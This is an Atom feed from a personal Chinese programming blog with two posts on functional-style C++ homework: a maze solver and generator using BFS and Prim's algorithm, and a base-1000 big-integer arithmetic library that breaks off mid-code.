<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>苟富</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://gaufoo.com/"/>
  <updated>2018-03-04T04:22:54.297Z</updated>
  <id>http://gaufoo.com/</id>
  
  <author>
    <name>Gaufoo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>用C++写出伪LISP代码（三）</title>
    <link href="http://gaufoo.com/2018/03/04/cppnlisp3/"/>
    <id>http://gaufoo.com/2018/03/04/cppnlisp3/</id>
    <published>2018-03-04T01:36:56.000Z</published>
    <updated>2018-03-04T04:22:54.297Z</updated>
    
    <content type="html"><![CDATA[<p>迷。</p>
<a id="more"></a>
<hr>
<p>老规矩<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mylist.h"</span></span></div></pre></td></tr></table></figure></p>
<hr>
<h1 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h1><p>设计一个迷宫游戏，给定迷宫的入口；如果存在出口，程序能够显示行走的路径，并最终到达出口，并输出“成功走出迷宫”；如果不存在出口，程序也能够显示行走的过程，并最终回退到入口，并输出“回退到入口”；</p>
<hr>
<h1 id="最终成果"><a href="#最终成果" class="headerlink" title="最终成果"></a>最终成果</h1><p><img src="/images/180303/photo_2333.gif"></p>
<hr>
<h1 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h1><p>要是以为这个作业的难度在于走迷宫，那就大错特错了。走迷宫不要太简单，像我这样完全没接触过OI、ACM的普通学生，一般都能想到用所谓的广度优先算法解决。<br>实际上，这个问题困难的地方在于生成迷宫，如何生成一个有且仅有一条通路的、视觉效果还不赖的迷宫，是做这个作业最终要解决的问题。</p>
<hr>
<h1 id="走迷宫"><a href="#走迷宫" class="headerlink" title="走迷宫"></a>走迷宫</h1><p>既然走迷宫是很容易解决的问题，我们就先挑这个软柿子捏捏。</p>
<hr>
<h2 id="按意愿编程法"><a href="#按意愿编程法" class="headerlink" title="按意愿编程法"></a>按意愿编程法</h2><p>《SICP》提出过这么一种编程思路 —— 按意愿编程。意思是，先别管你写的程序能不能跑，假装代码中的所有函数都能正常工作，尽管实际上还没实现。这个办法能让人从细节的纠缠中脱离，从大局出发，每次专注于某个功能的实现。<br>当初我用Scheme来写走迷宫就采用了这样的办法，所以非常快地解决了问题。</p>
<hr>
<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><p>是该有这么一个<code>find_way</code>函数，功能是这样的：查看走出迷宫没有，如果没有，那就走下一步，再查看走出迷宫没有，如果没有，那就走下一步，……，直至走出迷宫。<br><code>find_shortest_way</code>函数就是按意愿编程法的产物，因为我还没实现它，只是期望它能够帮我查找<code>ways</code>的所有路线中是否存在某条路线走出了迷宫。若找到了这条路线，<code>find_way</code>就圆满完成了任务，返回这条最短路线。<br>接下来的<code>for</code>循环，是由于我的<code>Map</code>函数不够完善而临时采用的遍历操作。它利用假想的<code>next_steps</code>函数，让<code>ways</code>中的每条路线都走出下一步，然后把这些“下一步”存储在<code>poor_new_ways</code>中。叫<code>poor</code>的原因是，我假想的<code>next_steps</code>函数直接产生上下左右四个新位置，还需要下一步的过滤操作。<br>过滤操作利用<code>is_forwardable</code>，就可以筛选出真正可以走的下一步。<br>最后再递归进行如上操作。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function">Way <span class="title">find_way</span><span class="params">(MyWayList ways)</span> </span>&#123;</div><div class="line">  <span class="keyword">auto</span> shortest_way&#123;find_shortest_way(ways)&#125;;</div><div class="line">  <span class="keyword">if</span> (!(shortest_way == EmptyCorList)) &#123;</div><div class="line">    <span class="keyword">return</span> shortest_way;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">auto</span> poor_new_ways&#123;EmptyWayList&#125;;</div><div class="line">    <span class="keyword">for</span>( <span class="keyword">auto</span> old_ways = ways</div><div class="line">        ; old_ways != EmptyWayList</div><div class="line">        ; poor_new_ways = Append(next_steps(old_ways-&gt;head()), poor_new_ways)</div><div class="line">        , old_ways = old_ways-&gt;tail()) &#123;&#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> find_way(Filter([<span class="keyword">this</span>](Way way) &#123; <span class="keyword">return</span> is_forwardable(way-&gt;head()); &#125;,</div><div class="line">                    poor_new_ways));    </div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面再去实现上面所需要的子函数。</p>
<hr>
<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>生成某条路线的所有可能的下一步。<code>first</code>、<code>second</code>分别代表坐标<code>x</code>、<code>y</code>。<code>C</code>函数用于构造坐标。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">MyWayList <span class="title">next_steps</span><span class="params">(Way way)</span> </span>&#123;</div><div class="line">  <span class="keyword">auto</span> last_pstion&#123;way-&gt;head()&#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> d&#123;Cons(C(last_pstion-&gt;first + <span class="number">1</span>, last_pstion-&gt;second), way)&#125;;</div><div class="line">  <span class="keyword">auto</span> u&#123;Cons(C(last_pstion-&gt;first - <span class="number">1</span>, last_pstion-&gt;second), way)&#125;;</div><div class="line">  <span class="keyword">auto</span> l&#123;Cons(C(last_pstion-&gt;first, last_pstion-&gt;second - <span class="number">1</span>), way)&#125;;</div><div class="line">  <span class="keyword">auto</span> r&#123;Cons(C(last_pstion-&gt;first, last_pstion-&gt;second + <span class="number">1</span>), way)&#125;;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> toList(&#123; d, u, l, r &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="可达与否"><a href="#可达与否" class="headerlink" title="可达与否"></a>可达与否</h2><p>下一步不可达的情况是：走出了边界范围、撞了墙、走了别的路线走过的位置。<br>需要特别提出的是：走了别的路线走过的位置。感觉这是一种挺精巧的想法：既然你慢了一步，不是第一条走这个位置的路线，你就已经失去了成为最短路线的可能，淘汰吧。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_forwardable</span><span class="params">(CorP step)</span> </span>&#123;</div><div class="line">  <span class="keyword">auto</span> not_out_of_bound = [=]() -&gt; <span class="keyword">bool</span> &#123;</div><div class="line">    <span class="keyword">auto</span> x_&#123;step-&gt;first&#125;;</div><div class="line">    <span class="keyword">auto</span> y_&#123;step-&gt;second&#125;;</div><div class="line">    <span class="keyword">return</span> (x_ &lt; xbound) &amp;&amp; (y_ &lt; ybound) &amp;&amp; (x_ &gt;= <span class="number">0</span>) &amp;&amp; (y_ &gt;= <span class="number">0</span>);</div><div class="line">  &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> not_wall = [=]() -&gt; <span class="keyword">bool</span> &#123;</div><div class="line">    <span class="keyword">return</span> step != wall; <span class="comment">// 伪代码，取决于具体实现</span></div><div class="line">  &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> not_been = [=]() -&gt; <span class="keyword">bool</span> &#123;</div><div class="line">    <span class="keyword">return</span> step != been; <span class="comment">// 伪代码，取决于具体实现</span></div><div class="line">  &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> not_out_of_bound() &amp;&amp; not_wall() &amp;&amp; not_been();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h2 id="到达终点与否"><a href="#到达终点与否" class="headerlink" title="到达终点与否"></a>到达终点与否</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function">Way <span class="title">find_shortest_way</span><span class="params">(MyWayList ways)</span> </span>&#123;</div><div class="line">  <span class="keyword">auto</span> is_reached = [=](Way way) -&gt; <span class="keyword">bool</span> &#123;</div><div class="line">    <span class="keyword">auto</span> step = way-&gt;head();</div><div class="line">    <span class="keyword">return</span> (step-&gt;first == destination-&gt;first &amp;&amp;</div><div class="line">      step-&gt;second == destination-&gt;second);</div><div class="line">  &#125;;</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> reachs&#123;Filter(is_reached, ways)&#125;;</div><div class="line">  <span class="keyword">return</span> (reachs == EmptyWayList) ? EmptyCorList : reachs-&gt;head();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<p>到此，走迷宫的代码已经完成。马上迎来重头戏：生成迷宫。</p>
<hr>
<h1 id="生成迷宫"><a href="#生成迷宫" class="headerlink" title="生成迷宫"></a>生成迷宫</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先看到这样一个有望成为迷宫的胚子：<br><img src="/images/180303/photo_2018-03-04_11-02-31.jpg"><br>我们需要做的是，把某些墙推倒，解放每个格子(cell)。离散数学中的最小生成树算法就派上了用场。<br>把每个格子都当成一个结点，让所有格子连成一棵树。树的每两个结点，都必定只有一条最短路径可达。这样恰好就是一个迷宫。<br>既然是最小生成树，那么每个结点的权重是多少？这里假设每个格子的东南西北四个方向邻接的格子权重相同，与其他格子的距离无限大。并采用随机挑选的办法来处理权重相同的结点。</p>
<h2 id="Prim-算法"><a href="#Prim-算法" class="headerlink" title="Prim 算法"></a>Prim 算法</h2><p>Prim算法是比较简单的最小生成树算法。我把这种思路整理成了如下的伪代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">未连通::Set &lt;- All</div><div class="line">已连通::Set &lt;- []</div><div class="line">待连通::Set &lt;- []</div><div class="line"></div><div class="line">a &lt;- 未连通.RandomGet()</div><div class="line">已连通.Add(a)</div><div class="line">未连通.Remove(a)</div><div class="line"></div><div class="line">b[] &lt;- Filter(a.Around, 未连通)</div><div class="line">待连通.Add(b[])</div><div class="line">未连通.Remove(b[])</div><div class="line"></div><div class="line">while (not 待连通.EMPTY)</div><div class="line">&#123;</div><div class="line">    c &lt;- 待连通.RandomGet()</div><div class="line">    d[] &lt;- Filter(c.Around, 已连通)</div><div class="line"></div><div class="line">    e &lt;- d[].RandomGet()</div><div class="line">    Connect(c, e)</div><div class="line">    待连通.Remove(c)</div><div class="line">    已连通.Add(c)</div><div class="line">    </div><div class="line">    f[] &lt;- Filter(c.Around, 未连通)</div><div class="line">    待连通.Add(f[])</div><div class="line">    未连通.Remove(f[])</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先明确，任何已连通的格子周围的格子都是待连通的格子。于是算法可以总结成：最开始先随机找到一个格子，加入已连通的集合。再从待连通集合里随机挑选一个格子，推倒它与已连通集合中随机挑选出的它周围的格子之间的墙。重复前过程直至待连通集合再无格子。<br>参考链接: <a href="http://weblog.jamisbuck.org/2011/1/10/maze-generation-prim-s-algorithm" target="_blank" rel="external">http://weblog.jamisbuck.org/2011/1/10/maze-generation-prim-s-algorithm</a></p>
<p>观察我的C++代码，基本与上述的伪代码一一对应：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">CorSet un;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; height; y++) &#123;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; width; x++) &#123;</div><div class="line">    un.insert( Cor(x, y) );</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">CorSet ed;</div><div class="line">CorSet ing;</div><div class="line"></div><div class="line"></div><div class="line">Cor a = *(<span class="built_in">std</span>::next(un.begin(), rand_int(<span class="number">0</span>, un.size())));</div><div class="line">ed.insert(a);</div><div class="line">un.erase(a);</div><div class="line"></div><div class="line"><span class="keyword">auto</span> b&#123;filterAround(a, un)&#125;;</div><div class="line"><span class="keyword">for</span> ( <span class="keyword">const</span> <span class="keyword">auto</span>&amp; x : *b ) &#123; </div><div class="line">  ing.insert(x);</div><div class="line">  un.erase(x);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">while</span> (!ing.empty()) &#123;</div><div class="line">  Cor c = *(<span class="built_in">std</span>::next(ing.begin(), rand_int(<span class="number">0</span>, ing.size())));</div><div class="line">  <span class="keyword">auto</span> d =  filterAround(c, ed);</div><div class="line"></div><div class="line">  Cor e = d-&gt;at(rand_int(<span class="number">0</span>, d-&gt;size()));</div><div class="line">  pullDown(c, e);</div><div class="line">  ing.erase(c);</div><div class="line">  ed.insert(c);</div><div class="line"></div><div class="line">  <span class="keyword">auto</span> f&#123;filterAround(c, un)&#125;;</div><div class="line">  <span class="keyword">for</span> ( <span class="keyword">const</span> <span class="keyword">auto</span>&amp; x : *f ) &#123; </div><div class="line">    ing.insert(x);</div><div class="line">    un.erase(x);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<p>最后就会得到一个长这样的迷宫：<br><img src="/images/180303/photo_2018-03-04_11-32-17.jpg"></p>
<hr>
<p>寒假作业终于告一段落，要开始写周末作业了……<br>完整代码：<a href="https://github.com/zhongzc/C-/blob/master/maze.cpp" target="_blank" rel="external">https://github.com/zhongzc/C-/blob/master/maze.cpp</a></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迷。&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="编程" scheme="http://gaufoo.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/tags/C/"/>
    
      <category term="LISP" scheme="http://gaufoo.com/tags/LISP/"/>
    
      <category term="函数式编程" scheme="http://gaufoo.com/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>用C++写出伪LISP代码（二）</title>
    <link href="http://gaufoo.com/2018/03/03/cppnlisp2/"/>
    <id>http://gaufoo.com/2018/03/03/cppnlisp2/</id>
    <published>2018-03-03T12:28:29.000Z</published>
    <updated>2018-03-04T04:16:58.892Z</updated>
    
    <content type="html"><![CDATA[<p>既已有基础材料，撸起袖子做作业。</p>
<a id="more"></a>
<hr>
<p>什么都别说，先把<a href="http://gaufoo.com/2018/03/03/cppnlisp1/">用C++写出伪LISP代码（一）</a>写的代码include进来：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mylist.h"</span></span></div></pre></td></tr></table></figure></p>
<hr>
<h1 id="作业要求"><a href="#作业要求" class="headerlink" title="作业要求"></a>作业要求</h1><p>问题描述：<br>  设计一个程序实现两个任意长的正数（包括正数和负数）、任意精度实数的算术运算；<br>提示：<br>  （1）用动态链表存储数据，每节点含一个整型变量，表示若干位数；<br>  （2）整数输入和输出按中国对于长整数的习惯表示，每3位1组，组间用逗号隔开；<br>  （3）实现长整数的加、减运算；<br>  （4）程序运行界面清晰实用；<br>选做：<br>  （1）求两长整数之商、积<br>  （2）高精度实数算术运算</p>
<hr>
<h1 id="最终成果"><a href="#最终成果" class="headerlink" title="最终成果"></a>最终成果</h1><p><img src="/images/180303/photo_2018-03-03_20-43-54.gif"></p>
<hr>
<h1 id="实现基础"><a href="#实现基础" class="headerlink" title="实现基础"></a>实现基础</h1><p>要求3位3位地分割大数，对于我来说，很容易想到这是1000进制的加减乘除问题。因此问题转换成：如何实现任意进制的加减乘除。问题变得更通用，解决起来更有趣味和意义。</p>
<hr>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>既然是用伪LISP代码来完成，首先明确结构就应该是<code>list</code>，用每个盒子的<code>head</code>来存储该每3位数。定义如下：<br>(*注：以下所有C++代码均采用C++14标准)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> IntList = MyList&lt;<span class="keyword">int</span>&gt;;</div><div class="line"><span class="keyword">auto</span> EmptyIntList = EmptyList&lt;<span class="keyword">int</span>&gt;;</div><div class="line"></div><div class="line"><span class="keyword">int</span> base = <span class="number">1000</span>;</div><div class="line"><span class="comment">// 可以改成任意进制数，这里是1000进制</span></div><div class="line"><span class="keyword">int</span> highest_unit = base - <span class="number">1</span>;</div><div class="line"><span class="comment">// 每种进制的位最大表示数，如1000进制即999，10进制即为9，2进制即为1。</span></div></pre></td></tr></table></figure></p>
<hr>
<h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>接触过计算机组成原理的读者都知道，计算机内部采用二进制补码形式表示数字。用补码来表示数字，可以有效简化一些运算。<br>遗憾的是，用补码并不能解决溢出问题，两个很大的正数相加，有可能会造成溢出，导致数位的循环，得到负数的结果。造成这样的结果原因是每个数字都只由有限的数位表示，一旦某些运算企图逾越这些数位的限制，便要承担运算错误的风险。<br>我决定也采用补码来进行进制运算，来获得运算的简化。但尽管我是在模拟进制运算，也采用补码，却由于可以动态申请内存，因此消除了溢出的风险，从而实现长整数运算。</p>
<p>至于什么是补码？简单地说：</p>
<ul>
<li>正数采用原有表示，但最高位添加符号位，为0。</li>
<li>0用0表示。</li>
<li>负数无视符号位，将所有位取反，再加1，最后最高位添加符号位，为进制最大表示数。</li>
</ul>
<p>想更为深入地了解何谓补码、为何用补码运算能简化计算，推荐阅读《编码》。</p>
<p>在这里，用一个<code>list</code>来存储一个补码表示的数字，最前面为最低位，<code>list</code>最深处则为最高位。</p>
<p>因此直接通过最高位来判断补码的正负性：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(IntList n)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> sign_digit = Reverse(n)-&gt;head();</div><div class="line">  <span class="keyword">return</span> sign_digit &gt;= (base / <span class="number">2</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">// 这里放宽了条件，理论上最高位应该只可能是0或者进制最大表示数</span></div></pre></td></tr></table></figure></p>
<hr>
<h2 id="位操作"><a href="#位操作" class="headerlink" title="位操作"></a>位操作</h2><h3 id="补充与抛弃"><a href="#补充与抛弃" class="headerlink" title="补充与抛弃"></a>补充与抛弃</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">fill_low_digit</span><span class="params">(IntList, <span class="keyword">int</span>, <span class="keyword">size_t</span>)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">fill_high_digit</span><span class="params">(IntList, <span class="keyword">int</span>, <span class="keyword">size_t</span>)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">clip_high_digit</span><span class="params">(IntList, <span class="keyword">size_t</span>)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">clip_low_digit</span><span class="params">(IntList, <span class="keyword">size_t</span>)</span></span>;</div></pre></td></tr></table></figure>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>补充低位操作，这个较简单，直接往最前面填需要填充的数字即可：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  filler: 填充的数字  count: 填充位数</span></div><div class="line"><span class="function">IntList <span class="title">fill_low_digit</span><span class="params">(IntList n, <span class="keyword">int</span> filler, <span class="keyword">size_t</span> count)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> (count == <span class="number">0</span>) ? n : Cons(filler, fill_low_digit(n, filler, count - <span class="number">1</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>补充高位操作，则需要翻转一下<code>list</code>，然后利用上面刚实现的函数：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  filler: 填充的数字  count: 填充位数</span></div><div class="line"><span class="function">IntList <span class="title">fill_high_digit</span><span class="params">(IntList n, <span class="keyword">int</span> filler, <span class="keyword">size_t</span> count)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> Reverse(fill_low_digit(Reverse(n), filler, count));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="抛弃"><a href="#抛弃" class="headerlink" title="抛弃"></a>抛弃</h4><p>抛弃高位，由于有自带的ListHead函数，可以直接调用：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  count: 抛弃位数</span></div><div class="line"><span class="function">IntList <span class="title">clip_high_digit</span><span class="params">(IntList n, <span class="keyword">size_t</span> count)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> ListHead(n, Length(n) - count);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>抛弃低位，同理：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  count: 抛弃位数</span></div><div class="line"><span class="function">IntList <span class="title">clip_low_digit</span><span class="params">(IntList n, <span class="keyword">size_t</span> count)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> ListTail(n, count);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="算术左移与右移"><a href="#算术左移与右移" class="headerlink" title="算术左移与右移"></a>算术左移与右移</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">shift_left</span><span class="params">(IntList, <span class="keyword">size_t</span>)</span></span>;</div><div class="line"><span class="function">IntList <span class="title">shift_right</span><span class="params">(IntList, <span class="keyword">size_t</span>)</span></span>;</div></pre></td></tr></table></figure>
<h4 id="算术左移"><a href="#算术左移" class="headerlink" title="算术左移"></a>算术左移</h4><p>可以直接抛弃高位，低位补0：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  count: 左移位数</span></div><div class="line"><span class="function">IntList <span class="title">shift_left</span><span class="params">(IntList n, <span class="keyword">size_t</span> count)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> fill_low_digit(clip_high_digit(n, count), <span class="number">0</span>, count);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="算术右移"><a href="#算术右移" class="headerlink" title="算术右移"></a>算术右移</h4><p>抛弃低位，高位补充符号位：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  count: 右移位数</span></div><div class="line"><span class="function">IntList <span class="title">shift_right</span><span class="params">(IntList n, <span class="keyword">size_t</span> count)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> raise_digits(clip_low_digit(n, count), Length(n));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>raise_digits</code>是用于提升位数的，这里只是借用。提升位数本质上是补充符号位的操作，补充符号位并不影响数值表示大小，下面来实现：</p>
<h3 id="位数提升"><a href="#位数提升" class="headerlink" title="位数提升"></a>位数提升</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// n: 补码  target_digits_length: 目标位数长度</span></div><div class="line"><span class="function">IntList <span class="title">raise_digits</span><span class="params">(IntList n, <span class="keyword">size_t</span> target_digits_length)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">auto</span> pre_len&#123;Length(n)&#125;;</div><div class="line">  <span class="keyword">if</span> (pre_len &gt; target_digits_length) &#123;</div><div class="line">    <span class="keyword">return</span> n;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">auto</span> count&#123;target_digits_length - pre_len&#125;;</div><div class="line">    <span class="keyword">return</span> is_negative(n) ?</div><div class="line">      fill_high_digit(n, highest_unit, count) :</div><div class="line">      fill_high_digit(n, <span class="number">0</span>, count);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注意，如果目标位数长度大于原位数长度，则不进行提升，直接返回原数。</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>取反的意思是将每一位都取成进制最大表示数与其之差。取反需要遍历，遍历需要<code>fold</code>：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function">IntList <span class="title">invert</span><span class="params">(IntList n)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> FoldRight([](<span class="keyword">int</span> x, IntList xs) &#123; <span class="keyword">return</span> Cons(highest_unit - x, xs); &#125;, </div><div class="line">                       EmptyIntList, n);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="进位"><a href="#进位" class="headerlink" title="进位"></a>进位</h3><p>进位的重要性不言而喻，要保证进位后每一个位都不能超过进制最大表示数：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc_carry</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n / base; &#125;</div><div class="line"><span class="comment">// 用于计算某个位需要往高位进几</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc_remain</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n % base; &#125;</div><div class="line"><span class="comment">// 用于计算某个位实际应当存放的数</span></div><div class="line"><span class="function">IntList <span class="title">carry</span><span class="params">(IntList n, <span class="keyword">int</span> 